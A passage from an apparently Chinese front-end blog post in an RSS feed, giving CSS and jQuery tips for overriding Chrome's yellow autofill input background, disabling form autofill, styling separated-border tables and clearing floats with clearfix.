  <span>background-image</span><span>:</span> none<span>;</span>
  <span>color</span><span>:</span> #000<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>在有些情况下, 这个黄色的背景会影响到我们界面的效果。 解决方法请往下看。</p>
<h2 id="让-input-文本框是纯色背景的" tabindex="-1"> 让 input 文本框是纯色背景的</h2>
<p>可以对 <code>input:-webkit-autofill</code> 使用足够大的纯色内阴影来覆盖 <code>input</code> 输入框的黄色背景, <code>For Example:</code></p>
<div><pre><code><span>input: -webkit-autofill</span> <span>{</span>
  <span>-webkit-box-shadow</span><span>:</span> 0 0 0 1000 white inset<span>;</span>
  <span>border</span><span>:</span> 1px solid #ccc <span>!important</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>如果你有使用圆角等属性, 或者发现输入框的长度高度不太对, 可以对其进行调整, 除了 <code>chrome</code> 默认定义的 <code>background-color</code> , <code>background-image</code> , <code>color</code> 不能用 <code>!important</code> 提升其优先级以外, 其他的属性均可使用 <code>!important</code> 提升其优先级, <code>For Example:</code></p>
<div><pre><code><span>input: -webkit-autofill</span> <span>{</span>
  <span>-webkit-box-shadow</span><span>:</span> 0 0 0 1000 white inset<span>;</span>
  <span>border</span><span>:</span> 1px solid #ccc <span>!important</span><span>;</span>
  <span>height</span><span>:</span> 27px <span>!important</span><span>;</span>
  <span>line-height</span><span>:</span> 27px <span>!important</span><span>;</span>
  <span>border-radius</span><span>:</span> 0 4px 4px 0<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="input-文本框是使用图片作为背景的" tabindex="-1"> input 文本框是使用图片作为背景的</h2>
<p>这个比较麻烦, 目前还没找到完美的解决方法, 有两种选择:</p>
<ul>
<li>如果你的图片背景不太复杂, 只有一些简单的内阴影, 那个人觉得完全可以使用上面介绍的方法用足够大的纯色内阴影去覆盖掉黄色背景, 此时只不过是没有了原来的内阴影效果罢了。</li>
<li>如果你实在想留住原来的内阴影效果, 那就只能牺牲 chrome 自动填充表单的功能, 使用 <code>JavaScript</code> 去实现, <code>For Example:</code></li>
</ul>
<div><pre><code><span>$</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>navigator<span>.</span>userAgent<span>.</span><span>toLowerCase</span><span>(</span><span>)</span><span>.</span><span>indexOf</span><span>(</span><span>"chrome"</span><span>)</span> <span>>=</span> <span>0</span><span>)</span> <span>{</span>
    <span>$</span><span>(</span>window<span>)</span><span>.</span><span>load</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
      <span>$</span><span>(</span><span>"ul input:not(input[type=submit])"</span><span>)</span><span>.</span><span>each</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
        <span>var</span> outHtml <span>=</span> <span>this</span><span>.</span>outerHTML<span>;</span>
        <span>$</span><span>(</span><span>this</span><span>)</span><span>.</span><span>append</span><span>(</span>outHtml<span>)</span><span>;</span>
      <span>}</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="关闭自动填充表单功能" tabindex="-1"> 关闭自动填充表单功能</h2>
<p>如果你既不想使用 <code>JavaScript</code> , 也不想用 <code>css</code> , 好吧, 在 <code>form</code> 标签上直接关闭了表单的自动填充功能: <code>autocomplete=&quot;off&quot;</code> 。 <code>For Example:</code></p>
<div><pre><code><span><span><span>&lt;</span>from</span> <span>action</span><span><span>=</span><span>"</span><span>"</span></span> <span>autocomplete</span><span><span>=</span><span>"</span>off<span>"</span></span><span>></span></span> ... <span><span><span>&lt;/</span>from</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="seperate-table" tabindex="-1"> seperate-table</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>.tab</span> <span>{</span>
  <span>border-collapse</span><span>:</span> separate<span>;</span>
  <span>border</span><span>:</span> 1px solid #e0e0e0<span>;</span>
<span>}</span>

<span>.tab th,
.tab td</span> <span>{</span>
  <span>padding</span><span>:</span> 3px<span>;</span>
  <span>font-size</span><span>:</span> 12px<span>;</span>
  <span>background</span><span>:</span> #f5f9fb<span>;</span>
  <span>border</span><span>:</span> 1px solid<span>;</span>
  <span>border-color</span><span>:</span> #fff #deedf6 #deedf6 #fff<span>;</span>
<span>}</span>

<span>.tab th</span> <span>{</span>
  <span>background</span><span>:</span> #edf4f0<span>;</span>
<span>}</span>

<span>.tab tr.even td</span> <span>{</span>
  <span>background</span><span>:</span> #fff<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>For Example:</code></p>
<div><pre><code><span><span><span>&lt;</span>table</span> <span>class</span><span><span>=</span><span>"</span>tab<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>100%<span>"</span></span> <span>cellpadding</span><span><span>=</span><span>"</span>0<span>"</span></span> <span>cellspacing</span><span><span>=</span><span>"</span>0<span>"</span></span> <span>border</span><span><span>=</span><span>"</span>0<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>tr</span><span>></span></span>
    <span><span><span>&lt;</span>th</span><span>></span></span>111<span><span><span>&lt;/</span>th</span><span>></span></span>
    <span><span><span>&lt;</span>td</span><span>></span></span>222<span><span><span>&lt;/</span>td</span><span>></span></span>
  <span><span><span>&lt;/</span>tr</span><span>></span></span>
  <span><span><span>&lt;</span>tr</span><span>></span></span>
    <span><span><span>&lt;</span>th</span><span>></span></span>111<span><span><span>&lt;/</span>th</span><span>></span></span>
    <span><span><span>&lt;</span>td</span><span>></span></span>222<span><span><span>&lt;/</span>td</span><span>></span></span>
  <span><span><span>&lt;/</span>tr</span><span>></span></span>
<span><span><span>&lt;/</span>table</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><a href="http://codepen.io/anon/pen/zBbRkJ?editors=1100#0" target="_blank" rel="noopener noreferrer">codepen 调试地址</a></p>
<h2 id="清除浮动-万能的-float-闭合" tabindex="-1"> 清除浮动, 万能的 float 闭合</h2>
<p>给需要闭合的 DIV（class 为 clearfix） 加上如下的 CSS 样式即可, <code>For Example:</code></p>
<div><pre><code><span>.clearfix:after</span> <span>{</span>
  <span>content</span><span>:</span> <span>"."</span><span>;</span>
  <span>display</span><span>:</span> block<span>;</span>
  <span>height</span><span>:</span> 0<span>;</span>
  <span>clear</span><span>:</span> both<span>;</span>
  <span>visibility</span><span>:</span> hidden<span>;</span>
<span>}</span>

<span>*html .clearfix</span> <span>{</span>
  <span>height</span><span>:</span> 1%<span>;</span>
<span>}</span>

<span>* + html .clearfix</span> <span>{</span>
  <span>height</span><span>:</span> 1%<span>;</span>
<span>}</span>

<span>.clearfix</span> <span>{</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
<span>}</span>

<span>.clearfix</span> <span>{</span>
  <span>display</span><span>:</span> block<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>不过貌似这样有点麻烦, 呵呵, 大前端常用的是下面的, <code>For Example:</code></p>
<div><pre><code><span>.clear</span> <span>{</span>
  <span>clear</span><span>:</span> both<span>;</span>
  <span>height</span><span>:</span> 0<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>上诉办法是在需要清除浮动的地方加个 div.clear 或者 br.clear, 我们知道这样能解决基本清浮动问题。 但是这种方法的最大缺陷就是改变了 html 结构, 虽然只是加个 div</p>
]]></content:encoded>
    </item>
  </channel>
</rss>